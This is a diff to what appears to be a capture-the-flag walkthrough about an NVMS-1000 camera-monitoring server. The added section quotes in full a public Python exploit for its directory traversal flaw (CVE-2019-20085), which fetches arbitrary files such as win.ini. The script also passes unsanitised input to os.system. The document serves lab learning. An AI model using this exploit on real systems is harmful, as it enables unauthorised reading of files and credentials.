@@ -314,7 +314,7 @@ Browsing the website:
 
 It's running an application called `"NVMS-1000"`.
 
-A `Software` suite used to monitor camera systems.
+A `software` suite used to monitor camera systems.
 
 If we search for `vulnerabilities`, we find the following:
 
@@ -327,6 +327,60 @@ If we search for `vulnerabilities`, we find the following:
 ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 NVMS 1000 - Directory Traversal                                                                                                                      | hardware/webapps/47774.txt
 TVT NVMS 1000 - Directory Traversal                                                                                                                  | hardware/webapps/48311.py
+```
+
+<br />
+
+Apparently, this application is vulnerable to a `path traversal` (LFI).
+
+Let's take a look at the Python script to understand the `vulnerability` and exploit it manually:
+
+<br />
+
+```python 
+# Exploit Title: TVT NVMS 1000 - Directory Traversal
+# Date: 2020-04-13
+# Exploit Author: Mohin Paramasivam (Shad0wQu35t)
+# Vendor Homepage: http://en.tvt.net.cn/
+# Version : N/A
+# Software Link : http://en.tvt.net.cn/products/188.html
+# Original Author : Numan Türle
+# CVE : CVE-2019-20085
+
+import sys
+import requests
+import os
+import time
+
+if len(sys.argv) !=4:
+	print "  "
+	print "Usage : python exploit.py url filename outputname"
+	print "Example : python exploit.py http://10.10.10.10/ windows/win.ini win.ini"
+	print "	"
+else:
+
+
+	traversal = "../../../../../../../../../../../../../"
+	filename = sys.argv[2]
+	url = sys.argv[1]+traversal+filename
+	outputname = sys.argv[3]
+	content = requests.get(url)
+
+	if content.status_code == 200:
+
+		print " "
+		print "Directory Traversal Succeeded"
+		time.sleep(3)
+		print " "
+		print "Saving Output"
+		os.system("touch " + outputname)
+		output_write = open(outputname,"r+")
+		output_write.write(content.text)
+		output_write.close()
+
+	else:
+
+		print "Host not vulnerable to Directory Traversal!"
 ```
 
 <br />
